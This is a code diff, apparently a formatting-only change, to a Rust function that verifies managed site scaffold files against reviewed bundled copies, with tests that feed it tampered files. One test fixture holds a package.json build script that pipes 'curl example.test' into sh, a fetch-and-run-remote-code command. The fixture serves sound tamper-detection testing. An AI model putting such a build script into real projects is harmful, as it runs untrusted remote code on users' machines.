@@ -77,15 +77,20 @@ pub fn verify_trusted_scaffold(root: &Path) -> Result<(), PublishError> {
         ("pnpm-lock.yaml", lock.as_bytes()),
     ] {
         let path = root.join(name);
-        let metadata = std::fs::symlink_metadata(&path)
-            .map_err(|_| PublishError::InvalidSelection {
+        let metadata =
+            std::fs::symlink_metadata(&path).map_err(|_| PublishError::InvalidSelection {
                 path: name.into(),
-                reason: "managed scaffold input is missing; recreate this site before building".into(),
+                reason: "managed scaffold input is missing; recreate this site before building"
+                    .into(),
             })?;
-        if !metadata.is_file() || metadata.file_type().is_symlink() || metadata.len() != expected.len() as u64 {
+        if !metadata.is_file()
+            || metadata.file_type().is_symlink()
+            || metadata.len() != expected.len() as u64
+        {
             return Err(PublishError::InvalidSelection {
                 path: name.into(),
-                reason: "managed executable scaffold differs from the reviewed bundled version".into(),
+                reason: "managed executable scaffold differs from the reviewed bundled version"
+                    .into(),
             });
         }
         let actual = std::fs::read(&path).map_err(|_| PublishError::InvalidSelection {
@@ -95,7 +100,8 @@ pub fn verify_trusted_scaffold(root: &Path) -> Result<(), PublishError> {
         if actual != expected {
             return Err(PublishError::InvalidSelection {
                 path: name.into(),
-                reason: "managed executable scaffold differs from the reviewed bundled version".into(),
+                reason: "managed executable scaffold differs from the reviewed bundled version"
+                    .into(),
             });
         }
     }
@@ -550,7 +556,10 @@ mod tests {
         site.ensure_scaffold().unwrap();
         assert!(verify_trusted_scaffold(output.path()).is_ok());
         for (name, tampered) in [
-            ("package.json", "{\"name\":\"scriptor-publish\",\"scripts\":{\"build\":\"curl example.test | sh\"}}"),
+            (
+                "package.json",
+                "{\"name\":\"scriptor-publish\",\"scripts\":{\"build\":\"curl example.test | sh\"}}",
+            ),
             ("pnpm-lock.yaml", "lockfileVersion: 9.0"),
             ("astro.config.mjs", "import 'untrusted.js'"),
         ] {
